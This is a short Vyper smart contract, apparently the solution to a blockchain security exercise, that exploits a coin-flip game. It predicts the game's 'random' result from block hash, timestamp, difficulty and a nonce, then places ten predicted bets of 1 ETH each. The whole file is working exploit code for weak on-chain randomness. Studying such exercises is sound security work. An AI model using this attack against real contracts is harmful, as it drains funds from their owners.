# @version ^0.3.2

"""
@title Coin Flipper Exploit
"""

interface Coinflipper:
    def flip_coin(guess: bool): payable
    def generator() -> address: view

interface Randomnumber:
    def generate_random_number() -> uint256: nonpayable
    def nonce() -> uint256: view

target: address

@external
def __init__(target: address):
    self.target = target

# YOUR EXPLOIT HERE
@internal
def guess(nonce: uint256) -> bool:
    digest: bytes32 = keccak256(
        concat(
            block.prevhash,
            convert(block.timestamp, bytes32),
            convert(block.difficulty, bytes32),
            convert(nonce, bytes32)
        )
    )

    return convert(digest, uint256) % 2 == 0

@external
@payable
def run():
    assert msg.value == 10 ** 18, "Not enough ETH"

    for nonce in range(10):       
        raw_call(
            self.target,
            _abi_encode(self.guess(nonce), method_id=method_id("flip_coin(bool)")),
            value=msg.value
        )
            
@external
@payable
def __default__():
    pass
